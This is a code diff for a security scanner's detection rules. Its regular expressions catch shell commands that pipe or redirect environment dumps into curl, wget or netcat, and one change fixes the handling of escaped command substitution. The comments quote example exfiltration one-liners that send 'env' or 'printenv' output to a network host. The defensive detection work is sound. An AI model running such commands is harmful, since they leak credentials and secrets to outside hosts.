@@ -87,11 +87,12 @@ const shellEnvDumpPipePattern = new RegExp(
     STDIN_NETWORK_CLIENT,
   ].join('')
 );
-// curl --data-binary @- URL <<< "$(env)", nc HOST PORT < <(printenv)
+// curl --data-binary @- URL <<< "$(env)", nc HOST PORT < <(printenv). The redirect must be on the
+// same command as the network client.
 const shellEnvDumpRedirectPattern = new RegExp(
   [
     '\\b(?:curl|wget|nc|ncat|netcat)\\b',
-    SHELL_COMMAND_TEXT,
+    SHELL_PIPELINE_STAGE_TEXT,
     '{0,200}(?:<<<\\s*"?|<\\s*)',
     ENV_DUMP_SUBSTITUTION,
   ].join('')
@@ -100,8 +101,9 @@ const shellEnvDumpRedirectPattern = new RegExp(
 // A single-quoted stdin argument ('@-') reaches the client unchanged, but the shell mask blanks
 // single-quoted text. The quotes become trailing spaces, so finding offsets do not move.
 const SINGLE_QUOTED_STDIN_ARGUMENT = /'(@?(?:-|\/dev\/stdin))'/g;
-// A command substitution inside a printed string still runs, so its line stays visible.
-const COMMAND_SUBSTITUTION = /\$\(|`/;
+// A command substitution inside a printed string still runs, so its line stays visible. An odd
+// number of backslashes before `$(` or a backtick escapes it, and the shell prints it as text.
+const UNESCAPED_COMMAND_SUBSTITUTION = /(?<!\\)(?:\\\\)*(?:\$\(|`)/;
 
 function maskNonExecutingEnvDumpText(content: string, filePath: string): string {
   if (!/\.(?:sh|bash)$/i.test(filePath)) return maskDocumentationTextInCode(content, filePath);
@@ -110,7 +112,7 @@ function maskNonExecutingEnvDumpText(content: string, filePath: string): string 
   return maskDocumentationTextInCode(unquoted, filePath)
     .split('\n')
     .map((line) =>
-      nonExecutingShellOutputPattern.test(line) && !COMMAND_SUBSTITUTION.test(line)
+      nonExecutingShellOutputPattern.test(line) && !UNESCAPED_COMMAND_SUBSTITUTION.test(line)
         ? maskLine(line)
         : line
     )
